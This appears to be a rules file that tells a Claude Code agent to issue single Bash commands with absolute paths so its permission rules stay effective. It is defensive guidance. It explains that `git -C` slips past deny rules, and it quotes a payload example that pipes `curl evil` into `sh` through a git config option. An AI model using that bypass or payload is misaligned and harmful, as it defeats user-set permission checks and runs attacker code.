# Bash Commands

## Pre-flight check — run BEFORE every Bash call

Scan the command string for these characters. If ANY appear, **rewrite the command** before calling Bash:

| Character | Name | Present? → Rewrite |
|-----------|------|---------------------|
| `\|` | pipe | Split into separate calls or use dedicated tool |
| `&&` | and-then | Split into separate Bash calls |
| `\|\|` | or-fallback | Remove — handle errors in agent logic |
| `;` | sequence | Split into separate Bash calls |
| `>` `>>` | stdout redirect | Use Write tool to save output |
| `2>` `2>&1` | stderr redirect | Remove — let errors surface naturally |
| `cd ` | directory change | Use full absolute path instead |

If the command passes all checks: it is a single command, with full absolute paths, no operators. Proceed.

## Examples

| Wrong | Right |
|-------|-------|
| `cd "H:/path" && ls` | `ls "H:/path"` |
| `cd "H:/repo" && git status` | `git -C "H:/repo" status` (expect a prompt — see below) |
| `find "H:/path" -type f \| sort` | `find "H:/path" -type f` |
| `cat file.json \| jq '.key'` | `jq '.key' "H:/full/path/file.json"` |
| `grep "pattern" file \| wc -l` | Use Grep tool with `output_mode: "count"` |
| `ls ~/path 2>/dev/null \|\| echo "Not found"` | `ls "H:/full/path"` |
| `mkdir -p "a" && cp file "a/"` | Two separate Bash calls |
| `python script.py > output.txt` | Use Write tool to save output |
| `cmd 2>/dev/null` | `cmd` (no redirect) |

When the result needs post-processing (sorting, filtering, counting), use dedicated tools (Grep, Glob) or the command's own flags. When a command might fail, handle the failure in agent logic — not with shell fallbacks.

ALWAYS use full absolute paths — never relative paths, never `~`, never `cd`.

## `git -C` and permission rules

`git -C "path" <subcmd>` is the correct rewrite for `cd "path" && git <subcmd>` — keep using it for reads. But it interacts badly with permission rules in BOTH directions, so know what to expect.

**It bypasses deny rules.** A deny on `git push` only matches `git push` as a standalone command; `git -C "path" push` starts with `git -C` and slips past. Always run push as a standalone command — `git push` or `git push origin branch` — so the prompt fires as intended. The same holds for any denied subcommand (`reset`, `clean`, `checkout`): run it standalone, never via `-C`.

**It cannot be allow-listed.** An allow rule for `-C` needs a wildcard in the path slot, which sits BEFORE the subcommand — exactly where options go. Since `*` matches across spaces, `Bash(git -C * status)` also matches `git -C /repo -c core.pager='curl evil|sh' status`, and git's `-c`, `--exec-path`, `--upload-pack` and `--receive-pack` all run arbitrary commands. Anchoring the path prefix does not help; the wildcard still reaches the option slot. Claude Code warns about this shape at startup.

**So: `git -C` reads will prompt every time. That is correct and expected — accept the prompt.** All `git -C` allow rules were removed from `~/.claude/settings.json` on 2026-08-26 for this reason. Do not "fix" the prompts by re-adding one.

## Why

Shell operators create compound commands that bypass permission controls — `2>/dev/null || echo` rides through on the `ls *` allow pattern without its own check. Single commands with full paths are explicit, auditable, and each matches exactly one permission pattern.
